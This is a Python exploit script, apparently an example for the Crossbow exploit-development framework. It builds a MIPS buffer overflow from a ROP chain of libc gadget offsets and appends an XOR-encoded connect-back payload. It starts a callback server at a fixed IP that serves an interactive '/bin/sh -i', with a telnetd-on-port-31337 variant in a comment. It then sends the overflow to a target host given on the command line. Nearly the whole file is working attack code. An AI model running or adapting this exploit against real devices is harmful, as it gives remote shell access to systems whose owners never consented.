#!/usr/bin/env python
# Copyright (c) 2013
# - Zachary Cutlip <uid000@gmail.com>
# - Tactical Network Solutions, LLC
# 
# See LICENSE.txt for more details.
# 


#This is an exmaple using Crossbow's EmptyOverflowBuffer class to build a buffer
#overflow

import os
import struct
import sys
import socket
import signal
import time
from crossbow.overflow_development.overflowbuilder import EmptyOverflowBuffer
from crossbow.common.support import LittleEndian
from crossbow.servers import ConnectbackHost
from crossbow.servers.callback_server import ConnectbackServer
from crossbow.payloads.mips.callback_payload import CallbackPayload
from crossbow.encoders.mips import MipsXorEncoder

CALLBACK_IP="192.168.1.65"
CALLBACK_PORT="8080"

qemu=False

libc_qemu_base=0x4084a000
libc_actual_base=0x2aaee000
libc_base=0

if qemu:
    libc_base=libc_qemu_base
else:
    libc_base=libc_actual_base

badchars=['\0',0x0d,'\n',0x20]

buf=EmptyOverflowBuffer(LittleEndian,default_base=libc_base,badchars=badchars,maxlength=2048)


buf.add_pattern(528)

#function_epilogue_rop
buf.add_rop_gadget(0x31b44,
            description="[$ra] function epilogue that sets up $s1-$s7")

buf.add_pattern(620-buf.len())
#address of sleep
buf.add_rop_gadget(0x506c0,
            description="Address of sleep() in libc. be sure to set up $ra and $a0 before calling.")

buf.add_pattern(628-buf.len())
#placeholder address that can be dereferenced without crashing, this goes in $s2
buf.add_rop_gadget(0x427a4,
            description="[$s2] placeholder, derefed without crashing.")


buf.add_pattern(644-buf.len())
#stackjumber. jalr $s0
buf.add_rop_gadget(0x1ffbc,description="[$s0] stackjumper")


buf.add_pattern(656-buf.len())
#Sleep arg 2 into $a0, stack data into $ra, then jalr $s0
buf.add_rop_gadget(0x43880,
            description="[$a0] Set up 2 sec arg to sleep(), then jalr $s1")

buf.add_pattern(688-buf.len())
#stackfinder. add 0xe0+var_c0 + $sp into $s0, jalr $s6
buf.add_rop_gadget(0x427a4,description="stackfinder.")


#you can instantiate a ConnectbackHost instead ad pass it to both
connectback_host=ConnectbackHost(CALLBACK_IP) #default port is 8080
connectback_server=ConnectbackServer(connectback_host,startcmd="/bin/sh -i")

#Or non-interactive exploitation:
#connectback_server=ConnectbackServer(connectback_host,startcmd="/usr/sbin/telnetd -p 31337",connectback_shell=False)

payload=CallbackPayload(connectback_host,LittleEndian)

encoded_payload=MipsXorEncoder(payload,LittleEndian,badchars=badchars)

buf.add_pattern(700-buf.len())
buf.add_string(encoded_payload.shellcode,
            description="encoded connect back payload")




if len(sys.argv) == 2:
    search_value=sys.argv[1]
    offset=buf.find_offset(search_value)
    if(offset < 0):
        print "Couldn't find string %s in the overflow buffer." % search_string
    else:
        print "Found string %s at\noffset: %d" % (search_string,offset)
    exit(0)


pid=None
pid=connectback_server.serve_connectback()
time.sleep(1)
if pid and pid > 0:
    try:
        addr=sys.argv[1]
        port=int(sys.argv[2])

        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

        sock.connect((addr,port))
        print("sending exploit.")
        sock.send(str(buf))
        sock.close()
        connectback_server.wait()
    except:

        print("Failed to connect. Killing connect-back server.")
        os.kill(pid,signal.SIGTERM)



